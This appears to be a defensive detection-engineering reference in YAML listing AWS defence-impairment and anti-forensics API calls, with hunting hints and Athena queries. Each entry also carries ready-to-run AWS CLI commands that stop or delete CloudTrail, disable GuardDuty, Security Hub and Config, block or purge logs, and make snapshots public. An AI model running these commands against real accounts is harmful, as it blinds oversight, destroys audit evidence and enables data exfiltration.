@@ -1,0 +1,1043 @@
+# AWS Defense Impairment & Stealth Techniques — Hunting Reference
+# MITRE ATT&CK: TA0005 (Defense Evasion), TA0040 (Impact)
+# Author: dbnz.io | Use for detection engineering and authorized red team simulation only.
+# ---
+# CLI commands are simulation/reproduction helpers for lab environments.
+# Always operate in isolated accounts with explicit authorization.
+
+meta:
+  title: AWS Antiforensics & Defense Impairment API Hunt List
+  version: "1.1"
+  frameworks:
+    - "MITRE ATT&CK Cloud Matrix"
+  services_covered:
+    - cloudtrail
+    - guardduty
+    - securityhub
+    - config
+    - s3
+    - logs
+    - events
+    - ec2
+    - lambda
+    - ecs
+
+# ─────────────────────────────────────────────────────────
+# TIER 1 — Hunt immediately
+# High confidence. Often observed in ransomware and APT campaigns.
+# Alert on any successful call with no additional context required.
+# ─────────────────────────────────────────────────────────
+tier_1:
+  label: "P1 — Alert on any success"
+  description: >
+    These calls have no meaningful legitimate use case at runtime in a
+    production account. Any successful invocation should trigger an
+    immediate investigation.
+
+  entries:
+
+    - id: T1-01
+      api: cloudtrail:StopLogging
+      service: cloudtrail
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Disables a CloudTrail trail. Kills the primary audit log source for
+        the trail's scope (single-region or multi-region depending on config).
+      hunt_angle: >
+        Alert on any call. Correlate with DescribeTrails to confirm zero
+        trails remain enabled in the region. Look for this as the first
+        call in a session preceding data exfil or encryption activity.
+      athena_hint: "eventName = 'StopLogging' AND errorCode IS NULL"
+      cli_reproduce: |
+        # Prerequisites: trail name from your lab account
+        TRAIL_NAME="my-lab-trail"
+
+        # 1. Verify current trail status
+        aws cloudtrail get-trail-status --name "$TRAIL_NAME"
+
+        # 2. Stop logging (the impairment action)
+        aws cloudtrail stop-logging --name "$TRAIL_NAME"
+
+        # 3. Verify trail is stopped
+        aws cloudtrail get-trail-status --name "$TRAIL_NAME" \
+          --query 'IsLogging'
+
+        # Cleanup: re-enable
+        # aws cloudtrail start-logging --name "$TRAIL_NAME"
+
+    - id: T1-02
+      api: cloudtrail:DeleteTrail
+      service: cloudtrail
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Permanently destroys a trail configuration. More destructive than
+        StopLogging — trail must be fully recreated to resume logging.
+      hunt_angle: >
+        Rare legitimate use. Flag if not followed by CreateTrail within
+        5 minutes by the same principal. Even if followed by CreateTrail,
+        inspect the new trail scope — attackers often replace multi-region
+        trails with hobbled single-region ones.
+      athena_hint: "eventName = 'DeleteTrail' AND errorCode IS NULL"
+      cli_reproduce: |
+        TRAIL_NAME="my-lab-trail"
+
+        # 1. List existing trails
+        aws cloudtrail describe-trails --include-shadow-trails false
+
+        # 2. Delete the trail (the impairment action)
+        aws cloudtrail delete-trail --name "$TRAIL_NAME"
+
+        # 3. Confirm deletion
+        aws cloudtrail describe-trails --include-shadow-trails false
+
+        # Cleanup: recreate trail
+        # aws cloudtrail create-trail \
+        #   --name "$TRAIL_NAME" \
+        #   --s3-bucket-name "my-ct-bucket" \
+        #   --is-multi-region-trail \
+        #   --include-global-service-events
+
+    - id: T1-03
+      api: s3:PutBucketPolicy
+      service: s3
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Applies a bucket policy that denies CloudTrail's ability to write
+        log files to its S3 destination. Invisible to cloudtrail:* API
+        monitors — only visible via S3 management event logging on the
+        CT bucket itself.
+      hunt_angle: >
+        Focus exclusively on the CloudTrail log delivery bucket. Look for
+        Deny statements targeting the cloudtrail.amazonaws.com principal
+        on s3:PutObject or s3:GetBucketAcl. This is the most underdetected
+        technique in this list.
+      athena_hint: >
+        eventName = 'PutBucketPolicy'
+        AND requestParameters.bucketName = '<your-ct-bucket>'
+        AND errorCode IS NULL
+      cli_reproduce: |
+        CT_BUCKET="my-lab-ct-log-bucket"
+        ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+
+        # 1. View current bucket policy
+        aws s3api get-bucket-policy --bucket "$CT_BUCKET" \
+          --query Policy --output text | python3 -m json.tool
+
+        # 2. Apply Deny policy blocking CloudTrail delivery (the impairment action)
+        cat > /tmp/ct-block-policy.json <<EOF
+        {
+          "Version": "2012-10-17",
+          "Statement": [
+            {
+              "Sid": "DenyCloudTrailDelivery",
+              "Effect": "Deny",
+              "Principal": {
+                "Service": "cloudtrail.amazonaws.com"
+              },
+              "Action": "s3:PutObject",
+              "Resource": "arn:aws:s3:::${CT_BUCKET}/AWSLogs/${ACCOUNT_ID}/*"
+            }
+          ]
+        }
+        EOF
+        aws s3api put-bucket-policy \
+          --bucket "$CT_BUCKET" \
+          --policy file:///tmp/ct-block-policy.json
+
+        # 3. Trigger a CloudTrail delivery and observe the delivery failure
+        aws cloudtrail get-trail-status --name "my-lab-trail" \
+          --query 'LatestDeliveryError'
+
+        # Cleanup: restore original policy or delete
+        # aws s3api delete-bucket-policy --bucket "$CT_BUCKET"
+
+    - id: T1-04
+      api: guardduty:DeleteDetector
+      service: guardduty
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Removes the GuardDuty detector for a region. Immediately blinds
+        runtime threat detection including DNS, network, and IAM anomaly
+        findings for all resources in that region.
+      hunt_angle: >
+        Always alert. Correlate IAM activity in the 15 minutes preceding
+        this call — attacker likely escalated privileges or created a new
+        key to perform this action. Check all regions, not just the one
+        where the call was made.
+      athena_hint: "eventName = 'DeleteDetector' AND errorCode IS NULL"
+      cli_reproduce: |
+        # 1. Get the detector ID for the current region
+        DETECTOR_ID=$(aws guardduty list-detectors \
+          --query 'DetectorIds[0]' --output text)
+        echo "Detector ID: $DETECTOR_ID"
+
+        # 2. Check current detector status
+        aws guardduty get-detector --detector-id "$DETECTOR_ID" \
+          --query '{Status: Status, UpdatedAt: UpdatedAt}'
+
+        # 3. Delete the detector (the impairment action)
+        aws guardduty delete-detector --detector-id "$DETECTOR_ID"
+
+        # 4. Confirm no detectors remain
+        aws guardduty list-detectors
+
+        # Cleanup: recreate detector
+        # aws guardduty create-detector --enable \
+        #   --finding-publishing-frequency FIFTEEN_MINUTES
+
+    - id: T1-05
+      api: guardduty:DisassociateMembers
+      service: guardduty
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Disconnects member accounts from GuardDuty administrator. Silences
+        findings from all disassociated accounts — particularly effective
+        in Organizations deployments where attacker compromises the
+        management or delegated admin account.
+      hunt_angle: >
+        Hunt from the GuardDuty delegated admin account. Look for bulk
+        disassociation (>2 members in a single call). Correlate with
+        Organizations API calls in same session.
+      athena_hint: "eventName IN ('DisassociateMembers','DeleteMembers') AND errorCode IS NULL"
+      cli_reproduce: |
+        DETECTOR_ID=$(aws guardduty list-detectors \
+          --query 'DetectorIds[0]' --output text)
+        MEMBER_ACCOUNT_ID="111122223333"  # replace with lab member account
+
+        # 1. List current members
+        aws guardduty list-members --detector-id "$DETECTOR_ID"
+
+        # 2. Disassociate a member account (the impairment action)
+        aws guardduty disassociate-members \
+          --detector-id "$DETECTOR_ID" \
+          --account-ids "$MEMBER_ACCOUNT_ID"
+
+        # 3. Confirm disassociation
+        aws guardduty list-members --detector-id "$DETECTOR_ID" \
+          --query 'Members[?AccountId==`'"$MEMBER_ACCOUNT_ID"'`]'
+
+    - id: T1-06
+      api: securityhub:DisableSecurityHub
+      service: securityhub
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Disables Security Hub entirely. Removes the aggregated finding
+        pipeline — GuardDuty, Config, Inspector, and custom findings stop
+        flowing to SIEM integrations that rely on Security Hub as the
+        aggregation layer.
+      hunt_angle: >
+        Alert immediately. Check if GuardDuty and Config findings are
+        still independently reaching your SIEM via direct EventBridge
+        integration — if not, you have a full blind spot.
+      athena_hint: "eventName = 'DisableSecurityHub' AND errorCode IS NULL"
+      cli_reproduce: |
+        # 1. Check current Security Hub status
+        aws securityhub describe-hub
+
+        # 2. Disable Security Hub (the impairment action)
+        aws securityhub disable-security-hub
+
+        # 3. Confirm disabled
+        aws securityhub describe-hub 2>&1
+
+        # Cleanup: re-enable
+        # aws securityhub enable-security-hub \
+        #   --enable-default-standards
+
+    - id: T1-07
+      api: config:StopConfigurationRecorder
+      service: config
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Stops the AWS Config configuration recorder. Halts resource
+        configuration tracking — no new config snapshots, no compliance
+        evaluations, no drift detection.
+      hunt_angle: >
+        Especially dangerous if Config is the primary source for CMK
+        rotation monitoring, security group drift, or public access
+        detection. Correlate with subsequent resource modifications.
+      athena_hint: "eventName IN ('StopConfigurationRecorder','DeleteConfigurationRecorder') AND errorCode IS NULL"
+      cli_reproduce: |
+        # 1. List recorders
+        aws configservice describe-configuration-recorders
+
+        RECORDER_NAME=$(aws configservice describe-configuration-recorders \
+          --query 'ConfigurationRecorders[0].name' --output text)
+
+        # 2. Check recorder status
+        aws configservice describe-configuration-recorder-status \
+          --configuration-recorder-names "$RECORDER_NAME"
+
+        # 3. Stop the recorder (the impairment action)
+        aws configservice stop-configuration-recorder \
+          --configuration-recorder-name "$RECORDER_NAME"
+
+        # 4. Confirm stopped
+        aws configservice describe-configuration-recorder-status \
+          --configuration-recorder-names "$RECORDER_NAME" \
+          --query 'ConfigurationRecordersStatus[0].recording'
+
+        # Cleanup: restart recorder
+        # aws configservice start-configuration-recorder \
+        #   --configuration-recorder-name "$RECORDER_NAME"
+
+# ─────────────────────────────────────────────────────────
+# TIER 2 — Hunt with context
+# Legitimate use exists. Attacker pattern is distinct from normal ops.
+# Enrich with before/after parameter diff, principal baseline, and session context.
+# ─────────────────────────────────────────────────────────
+tier_2:
+  label: "P2 — Alert with enrichment"
+  description: >
+    These APIs have valid operational uses. Detection requires comparing
+    request parameters against a known-good baseline or looking for
+    combinations with other suspicious calls in the same session.
+
+  entries:
+
+    - id: T2-01
+      api: cloudtrail:UpdateTrail
+      service: cloudtrail
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Modifies trail configuration to reduce coverage. Attackers
+        typically set IsMultiRegionTrail=false, IncludeGlobalServiceEvents=false,
+        or remove S3/Lambda data event logging.
+      hunt_angle: >
+        Diff requestParameters against the prior trail config. Flag any
+        transition from multi-region to single-region, or disabling of
+        global service events (which covers IAM, STS, CloudFront).
+      athena_hint: >
+        eventName = 'UpdateTrail' AND errorCode IS NULL
+        -- then inspect requestParameters for isMultiRegionTrail=false
+        -- or includeGlobalServiceEvents=false
+      cli_reproduce: |
+        TRAIL_NAME="my-lab-trail"
+
+        # 1. Show current config
+        aws cloudtrail describe-trails --trail-name-list "$TRAIL_NAME"
+
+        # 2. Narrow trail to single-region, disable global events (the impairment action)
+        aws cloudtrail update-trail \
+          --name "$TRAIL_NAME" \
+          --no-is-multi-region-trail \
+          --no-include-global-service-events
+
+        # 3. Confirm degraded config
+        aws cloudtrail describe-trails --trail-name-list "$TRAIL_NAME" \
+          --query 'trailList[0].{MultiRegion:IsMultiRegionTrail, GlobalEvents:IncludeGlobalServiceEvents}'
+
+        # Cleanup: restore full coverage
+        # aws cloudtrail update-trail \
+        #   --name "$TRAIL_NAME" \
+        #   --is-multi-region-trail \
+        #   --include-global-service-events
+
+    - id: T2-02
+      api: cloudtrail:PutEventSelectors
+      service: cloudtrail
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Modifies which events are captured. Setting ReadWriteType to
+        ReadOnly removes all write/management event logging — the most
+        forensically valuable events. Removing data event selectors
+        eliminates S3 object-level and Lambda invocation logging.
+      hunt_angle: >
+        Look for ReadWriteType transitioning to ReadOnly, or
+        DataResources being emptied. High-value antiforensics move
+        because it looks like a cost-optimization.
+      athena_hint: "eventName = 'PutEventSelectors' AND errorCode IS NULL"
+      cli_reproduce: |
+        TRAIL_NAME="my-lab-trail"
+
+        # 1. Show current event selectors
+        aws cloudtrail get-event-selectors --trail-name "$TRAIL_NAME"
+
+        # 2. Set to ReadOnly only (the impairment action — drops all write events)
+        aws cloudtrail put-event-selectors \
+          --trail-name "$TRAIL_NAME" \
+          --event-selectors '[{
+            "ReadWriteType": "ReadOnly",
+            "IncludeManagementEvents": true,
+            "DataResources": []
+          }]'
+
+        # 3. Verify change
+        aws cloudtrail get-event-selectors --trail-name "$TRAIL_NAME"
+
+        # Cleanup: restore write events
+        # aws cloudtrail put-event-selectors \
+        #   --trail-name "$TRAIL_NAME" \
+        #   --event-selectors '[{
+        #     "ReadWriteType": "All",
+        #     "IncludeManagementEvents": true,
+        #     "DataResources": []
+        #   }]'
+
+    - id: T2-03
+      api: events:PutRule
+      service: events
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Creates or modifies an EventBridge rule targeting GuardDuty or
+        Security Hub events with a Drop action or unexpected target.
+        Effectively suppresses alerts before they reach the SIEM.
+      hunt_angle: >
+        Hunt for rules with event patterns matching aws.guardduty or
+        aws.securityhub that route to unexpected targets or that have
+        been modified after initial creation. Especially dangerous in
+        accounts with automated remediation pipelines.
+      athena_hint: >
+        eventName IN ('PutRule','PutTargets') AND errorCode IS NULL
+        -- inspect requestParameters.eventPattern for guardduty/securityhub
+      cli_reproduce: |
+        EVENT_BUS="default"
+
+        # 1. List existing rules targeting GuardDuty
+        aws events list-rules --event-bus-name "$EVENT_BUS" \
+          --query 'Rules[?contains(EventPattern, `guardduty`)]'
+
+        # 2. Create a disabled decoy rule that drops GD HIGH findings (impairment action)
+        aws events put-rule \
+          --name "suppress-gd-high" \
+          --event-bus-name "$EVENT_BUS" \
+          --event-pattern '{
+            "source": ["aws.guardduty"],
+            "detail-type": ["GuardDuty Finding"],
+            "detail": {
+              "severity": [{"numeric": [">=", 7]}]
+            }
+          }' \
+          --state DISABLED \
+          --description "Lab: suppression rule simulation"
+
+        # 3. In a real attack, attacker would ENABLE and route to a null target
+        # Keeping DISABLED here for safe lab simulation
+
+        # Cleanup
+        # aws events delete-rule --name "suppress-gd-high" \
+        #   --event-bus-name "$EVENT_BUS"
+
+    - id: T2-04
+      api: guardduty:UpdateDetector
+      service: guardduty
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Changes FindingPublishingFrequency from FIFTEEN_MINUTES (default)
+        to SIX_HOURS. Does not disable GuardDuty but introduces a 6-hour
+        delay in finding delivery — enough time to complete and clean up
+        an intrusion before alerts fire.
+      hunt_angle: >
+        Any change away from FIFTEEN_MINUTES warrants investigation.
+        ONE_HOUR or SIX_HOURS in a production account is almost never
+        a legitimate operations change.
+      athena_hint: >
+        eventName = 'UpdateDetector' AND errorCode IS NULL
+        -- inspect requestParameters.findingPublishingFrequency != 'FIFTEEN_MINUTES'
+      cli_reproduce: |
+        DETECTOR_ID=$(aws guardduty list-detectors \
+          --query 'DetectorIds[0]' --output text)
+
+        # 1. Check current publishing frequency
+        aws guardduty get-detector --detector-id "$DETECTOR_ID" \
+          --query 'FindingPublishingFrequency'
+
+        # 2. Slow down finding delivery to 6 hours (the impairment action)
+        aws guardduty update-detector \
+          --detector-id "$DETECTOR_ID" \
+          --finding-publishing-frequency SIX_HOURS
+
+        # 3. Confirm change
+        aws guardduty get-detector --detector-id "$DETECTOR_ID" \
+          --query 'FindingPublishingFrequency'
+
+        # Cleanup: restore
+        # aws guardduty update-detector \
+        #   --detector-id "$DETECTOR_ID" \
+        #   --finding-publishing-frequency FIFTEEN_MINUTES
+
+    - id: T2-05
+      api: guardduty:CreateFilter
+      service: guardduty
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Creates a GuardDuty suppression filter with Action=ARCHIVE.
+        Matching findings are auto-archived and never surface to SIEM.
+        Particularly dangerous when scoped to high-severity finding types
+        like UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.
+      hunt_angle: >
+        Alert on any new filter with Action=ARCHIVE. Inspect the
+        FindingCriteria for overly broad conditions (e.g. entire finding
+        type families suppressed). Compare against approved filter
+        baseline if one exists.
+      athena_hint: "eventName = 'CreateFilter' AND errorCode IS NULL"
+      cli_reproduce: |
+        DETECTOR_ID=$(aws guardduty list-detectors \
+          --query 'DetectorIds[0]' --output text)
+
+        # 1. List existing filters
+        aws guardduty list-filters --detector-id "$DETECTOR_ID"
+
+        # 2. Create broad suppression filter (the impairment action)
+        aws guardduty create-filter \
+          --detector-id "$DETECTOR_ID" \
+          --name "lab-suppression-filter" \
+          --action ARCHIVE \
+          --finding-criteria '{
+            "Criterion": {
+              "type": {
+                "Eq": ["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"]
+              }
+            }
+          }' \
+          --description "Lab: suppression filter simulation"
+
+        # 3. Verify filter exists
+        aws guardduty get-filter \
+          --detector-id "$DETECTOR_ID" \
+          --filter-name "lab-suppression-filter"
+
+        # Cleanup
+        # aws guardduty delete-filter \
+        #   --detector-id "$DETECTOR_ID" \
+        #   --filter-name "lab-suppression-filter"
+
+    - id: T2-06
+      api: ec2:DeleteFlowLogs
+      service: ec2
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Removes VPC flow logs. Eliminates network-layer forensics — no
+        source/destination IP, no port data, no traffic volume for
+        lateral movement or C2 communication analysis.
+      hunt_angle: >
+        Correlate with EC2 or EKS lateral movement attempts. Look for
+        this call shortly before or after unusual SSH/RDP or API calls
+        from unexpected EC2 instance profiles.
+      athena_hint: "eventName = 'DeleteFlowLogs' AND errorCode IS NULL"
+      cli_reproduce: |
+        VPC_ID="vpc-0123456789abcdef0"  # replace with lab VPC
+
+        # 1. List flow logs for the VPC
+        aws ec2 describe-flow-logs \
+          --filter Name=resource-id,Values="$VPC_ID" \
+          --query 'FlowLogs[*].{ID:FlowLogId, Status:FlowLogStatus, Dest:LogDestination}'
+
+        FLOW_LOG_ID=$(aws ec2 describe-flow-logs \
+          --filter Name=resource-id,Values="$VPC_ID" \
+          --query 'FlowLogs[0].FlowLogId' --output text)
+
+        # 2. Delete the flow log (the impairment action)
+        aws ec2 delete-flow-logs --flow-log-ids "$FLOW_LOG_ID"
+
+        # 3. Confirm deletion
+        aws ec2 describe-flow-logs --flow-log-ids "$FLOW_LOG_ID" 2>&1
+
+    - id: T2-07
+      api: logs:DeleteLogGroup
+      service: logs
+      mitre: T1070.004
+      tactic: Defense Evasion / Indicator Removal
+      description: >
+        Destroys CloudWatch Logs groups and all contained streams.
+        Particularly impactful on /aws/lambda/ groups (Lambda execution
+        logs) and VPC flow log groups.
+      hunt_angle: >
+        Rare legitimate use for active production groups. Focus on
+        /aws/lambda/, /aws/eks/, /vpc/flow/ prefixes. Correlate with
+        Lambda-based attacks (e.g. privilege escalation via function update).
+      athena_hint: >
+        eventName IN ('DeleteLogGroup','DeleteLogStream') AND errorCode IS NULL
+        -- filter requestParameters.logGroupName for /aws/lambda/ prefix
+      cli_reproduce: |
+        LOG_GROUP="/aws/lambda/my-lab-function"
+
+        # 1. Verify log group exists
+        aws logs describe-log-groups \
+          --log-group-name-prefix "$LOG_GROUP" \
+          --query 'logGroups[*].{Name:logGroupName, Retained:retentionInDays}'
+
+        # 2. Delete the log group (the impairment action)
+        aws logs delete-log-group --log-group-name "$LOG_GROUP"
+
+        # 3. Confirm deletion
+        aws logs describe-log-groups \
+          --log-group-name-prefix "$LOG_GROUP"
+
+    - id: T2-08
+      api: logs:PutRetentionPolicy
+      service: logs
+      mitre: T1070.004
+      tactic: Defense Evasion / Indicator Removal
+      description: >
+        Sets a short retention period on a log group. Logs auto-purge
+        after the retention window. Setting 1-day retention on an active
+        log group causes evidence to disappear without any explicit
+        delete call — harder to detect than DeleteLogGroup.
+      hunt_angle: >
+        Look for retention being set to 1 or 3 days on log groups that
+        previously had Never Expire. Especially sneaky: appears to be a
+        cost-optimization action to reviewers.
+      athena_hint: >
+        eventName = 'PutRetentionPolicy' AND errorCode IS NULL
+        -- inspect requestParameters.retentionInDays in [1, 3, 5]
+      cli_reproduce: |
+        LOG_GROUP="/aws/lambda/my-lab-function"
+
+        # 1. Check current retention
+        aws logs describe-log-groups \
+          --log-group-name-prefix "$LOG_GROUP" \
+          --query 'logGroups[0].retentionInDays'
+
+        # 2. Set 1-day retention (the impairment action — logs purge after 24h)
+        aws logs put-retention-policy \
+          --log-group-name "$LOG_GROUP" \
+          --retention-in-days 1
+
+        # 3. Confirm change
+        aws logs describe-log-groups \
+          --log-group-name-prefix "$LOG_GROUP" \
+          --query 'logGroups[0].retentionInDays'
+
+        # Cleanup: remove retention policy (reverts to never expire)
+        # aws logs delete-retention-policy --log-group-name "$LOG_GROUP"
+
+    - id: T2-09
+      api: events:DisableRule
+      service: events
+      mitre: T1562.001
+      tactic: Defense Evasion
+      description: >
+        Disables an EventBridge rule. Can kill automated remediation
+        pipelines that trigger on GuardDuty or Config findings — e.g.
+        a rule that auto-revokes public S3 buckets or auto-quarantines
+        compromised IAM keys.
+      hunt_angle: >
+        Watch for rules associated with security automation being
+        disabled. Correlate rule name against known remediation
+        functions. Low noise — check for this in combination with
+        T1 or T2 calls in same session.
+      athena_hint: "eventName = 'DisableRule' AND errorCode IS NULL"
+      cli_reproduce: |
+        RULE_NAME="auto-remediate-public-s3"  # your lab remediation rule
+        EVENT_BUS="default"
+
+        # 1. Check current rule state
+        aws events describe-rule \
+          --name "$RULE_NAME" \
+          --event-bus-name "$EVENT_BUS" \
+          --query 'State'
+
+        # 2. Disable the remediation rule (the impairment action)
+        aws events disable-rule \
+          --name "$RULE_NAME" \
+          --event-bus-name "$EVENT_BUS"
+
+        # 3. Confirm disabled
+        aws events describe-rule \
+          --name "$RULE_NAME" \
+          --event-bus-name "$EVENT_BUS" \
+          --query 'State'
+
+        # Cleanup
+        # aws events enable-rule \
+        #   --name "$RULE_NAME" \
+        #   --event-bus-name "$EVENT_BUS"
+
+# ─────────────────────────────────────────────────────────
+# TIER 3 — Hunt for stealth patterns
+# Low noise individually. Often used as pre-positioning or cleanup.
+# Highest value when correlated with T1/T2 calls in same session.
+# ─────────────────────────────────────────────────────────
+tier_3:
+  label: "P3 — Correlate and baseline"
+  description: >
+    These techniques are subtle and individually low-signal. Build
+    detections that correlate these with T1/T2 calls or look for
+    session-level patterns rather than single-call alerting.
+
+  entries:
+
+    - id: T3-01
+      api: cloudtrail:CreateTrail (degraded config)
+      service: cloudtrail
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        After deleting a multi-region trail, attacker creates a
+        single-region replacement. Appears as legitimate trail
+        maintenance but provides a fraction of the original coverage.
+      hunt_angle: >
+        Check IsMultiRegionTrail=false and IncludeGlobalServiceEvents=false
+        immediately after a DeleteTrail in the same session. The gap
+        between deletion and recreation is also a blind spot window.
+      athena_hint: >
+        eventName = 'CreateTrail' AND errorCode IS NULL
+        -- join to prior DeleteTrail in same session
+        -- inspect requestParameters.isMultiRegionTrail = false
+      cli_reproduce: |
+        CT_BUCKET="my-lab-ct-bucket"
+        TRAIL_NAME="my-lab-trail-degraded"
+
+        # 1. Create a hobbled single-region trail (simulates post-delete replacement)
+        aws cloudtrail create-trail \
+          --name "$TRAIL_NAME" \
+          --s3-bucket-name "$CT_BUCKET" \
+          --no-is-multi-region-trail \
+          --no-include-global-service-events
+
+        # 2. Verify degraded config
+        aws cloudtrail describe-trails \
+          --trail-name-list "$TRAIL_NAME" \
+          --query 'trailList[0].{MultiRegion:IsMultiRegionTrail, GlobalEvents:IncludeGlobalServiceEvents}'
+
+        # Cleanup
+        # aws cloudtrail delete-trail --name "$TRAIL_NAME"
+
+    - id: T3-02
+      api: s3:PutBucketLifecycleConfiguration
+      service: s3
+      mitre: T1070.004
+      tactic: Defense Evasion / Indicator Removal
+      description: >
+        Adds a lifecycle rule with a short Expiration to auto-delete
+        log objects from the CT bucket. Logs purge automatically
+        without any subsequent API call — leaves minimal trace.
+      hunt_angle: >
+        Any Expiration rule under 90 days on the CT log bucket or
+        access log bucket is suspicious. Watch for new rules appearing
+        on buckets that had no prior lifecycle configuration.
+      athena_hint: >
+        eventName = 'PutBucketLifecycleConfiguration' AND errorCode IS NULL
+        -- check requestParameters.bucketName matches CT bucket
+      cli_reproduce: |
+        CT_BUCKET="my-lab-ct-log-bucket"
+
+        # 1. Check existing lifecycle rules
+        aws s3api get-bucket-lifecycle-configuration \
+          --bucket "$CT_BUCKET" 2>&1
+
+        # 2. Add short-expiry lifecycle rule (the impairment action)
+        aws s3api put-bucket-lifecycle-configuration \
+          --bucket "$CT_BUCKET" \
+          --lifecycle-configuration '{
+            "Rules": [{
+              "ID": "log-cleanup",
+              "Status": "Enabled",
+              "Filter": {"Prefix": "AWSLogs/"},
+              "Expiration": {"Days": 1}
+            }]
+          }'
+
+        # 3. Verify rule
+        aws s3api get-bucket-lifecycle-configuration \
+          --bucket "$CT_BUCKET"
+
+        # Cleanup
+        # aws s3api delete-bucket-lifecycle --bucket "$CT_BUCKET"
+
+    - id: T3-03
+      api: s3:DeleteObject (CT log bucket)
+      service: s3
+      mitre: T1070.004
+      tactic: Defense Evasion / Indicator Removal
+      description: >
+        Direct deletion of CloudTrail log files from S3. Only detectable
+        if S3 data event logging is enabled on the CT bucket itself
+        (a separate CloudTrail configuration, often not enabled).
+      hunt_angle: >
+        Requires S3 object-level data events enabled on CT bucket.
+        Match against AWSLogs/ key prefix. Often performed after
+        exfiltrating specific log files to destroy them selectively.
+      athena_hint: >
+        eventName = 'DeleteObject' AND errorCode IS NULL
+        AND requestParameters.bucketName = '<ct-bucket>'
+        AND requestParameters.key LIKE 'AWSLogs/%'
+      cli_reproduce: |
+        CT_BUCKET="my-lab-ct-log-bucket"
+
+        # NOTE: First verify S3 data events are enabled on this bucket
+        # via CloudTrail, otherwise this action itself won't be logged.
+
+        # 1. List log files
+        aws s3 ls "s3://${CT_BUCKET}/AWSLogs/" --recursive | head -5
+
+        # 2. Delete a specific log file (the impairment action)
+        # Replace with an actual key from your lab bucket
+        aws s3 rm "s3://${CT_BUCKET}/AWSLogs/ACCOUNTID/CloudTrail/REGION/YYYY/MM/DD/logfile.json.gz"
+
+    - id: T3-04
+      api: lambda:UpdateFunctionConfiguration
+      service: lambda
+      mitre: T1562
+      tactic: Defense Evasion
+      description: >
+        Modifies Lambda function configuration to remove logging settings,
+        strip environment variables used by security tooling, or change
+        the VPC config to bypass network controls.
+      hunt_angle: >
+        Watch for removal of POWERTOOLS_LOG_LEVEL, SIEM endpoint env vars,
+        or changes to LoggingConfig on security-facing functions. Correlated
+        with Lambda-based privilege escalation chains.
+      athena_hint: "eventName = 'UpdateFunctionConfiguration' AND errorCode IS NULL"
+      cli_reproduce: |
+        FUNCTION_NAME="my-lab-security-function"
+
+        # 1. Show current config
+        aws lambda get-function-configuration \
+          --function-name "$FUNCTION_NAME" \
+          --query '{LogGroup:LoggingConfig, EnvVars:Environment}'
+
+        # 2. Remove logging configuration (the impairment action)
+        aws lambda update-function-configuration \
+          --function-name "$FUNCTION_NAME" \
+          --logging-config '{"LogFormat":"Text","LogGroup":""}'
+
+        # Cleanup: restore log group
+        # aws lambda update-function-configuration \
+        #   --function-name "$FUNCTION_NAME" \
+        #   --logging-config '{"LogFormat":"JSON","LogGroup":"/aws/lambda/my-lab-security-function"}'
+
+    - id: T3-05
+      api: ec2:ModifySnapshotAttribute
+      service: ec2
+      mitre: T1537
+      tactic: Exfiltration
+      description: >
+        Makes an EBS snapshot public or shares it with an attacker-controlled
+        account. Enables data exfiltration without S3 or network data transfer.
+        Also contaminates forensic evidence chain.
+      hunt_angle: >
+        Hunt for createVolumePermission + Group=all (public). Also look for
+        specific AccountId additions in requestParameters if sharing with
+        external accounts. Often appears late in an intrusion chain.
+      athena_hint: >
+        eventName = 'ModifySnapshotAttribute' AND errorCode IS NULL
+        AND requestParameters.createVolumePermission.add.items[0].group = 'all'
+      cli_reproduce: |
+        SNAPSHOT_ID="snap-0123456789abcdef0"  # replace with lab snapshot
+
+        # 1. Check current snapshot permissions
+        aws ec2 describe-snapshot-attribute \
+          --snapshot-id "$SNAPSHOT_ID" \
+          --attribute createVolumePermission
+
+        # 2. Make snapshot public (the impairment/exfil action)
+        aws ec2 modify-snapshot-attribute \
+          --snapshot-id "$SNAPSHOT_ID" \
+          --attribute createVolumePermission \
+          --operation-type add \
+          --group-names all
+
+        # 3. Verify
+        aws ec2 describe-snapshot-attribute \
+          --snapshot-id "$SNAPSHOT_ID" \
+          --attribute createVolumePermission
+
+        # Cleanup: remove public access
+        # aws ec2 modify-snapshot-attribute \
+        #   --snapshot-id "$SNAPSHOT_ID" \
+        #   --attribute createVolumePermission \
+        #   --operation-type remove \
+        #   --group-names all
+
+    - id: T3-06
+      api: logs:PutBucketLogging (disable)
+      service: s3
+      mitre: T1562.008
+      tactic: Defense Evasion
+      description: >
+        Disables S3 server access logging on forensic artifact buckets
+        by setting an empty LoggingEnabled configuration. Removes
+        per-request access logs that complement CloudTrail data events.
+      hunt_angle: >
+        Low priority standalone. Elevated if the target bucket holds
+        IR artifacts, CT logs, or SIEM exports. Look for empty
+        LoggingEnabled in requestParameters on sensitive bucket names.
+      athena_hint: >
+        eventName = 'PutBucketLogging' AND errorCode IS NULL
+        -- inspect requestParameters for empty LoggingEnabled block
+      cli_reproduce: |
+        TARGET_BUCKET="my-lab-artifact-bucket"
+
+        # 1. Check current logging config
+        aws s3api get-bucket-logging --bucket "$TARGET_BUCKET"
+
+        # 2. Disable server access logging (the impairment action)
+        aws s3api put-bucket-logging \
+          --bucket "$TARGET_BUCKET" \
+          --bucket-logging-status '{}'
+
+        # 3. Confirm logging disabled
+        aws s3api get-bucket-logging --bucket "$TARGET_BUCKET"
+
+        # Cleanup: restore logging (requires a target logging bucket)
+        # aws s3api put-bucket-logging \
+        #   --bucket "$TARGET_BUCKET" \
+        #   --bucket-logging-status '{
+        #     "LoggingEnabled": {
+        #       "TargetBucket": "my-access-log-bucket",
+        #       "TargetPrefix": "'"$TARGET_BUCKET"'/"
+        #     }
+        #   }'
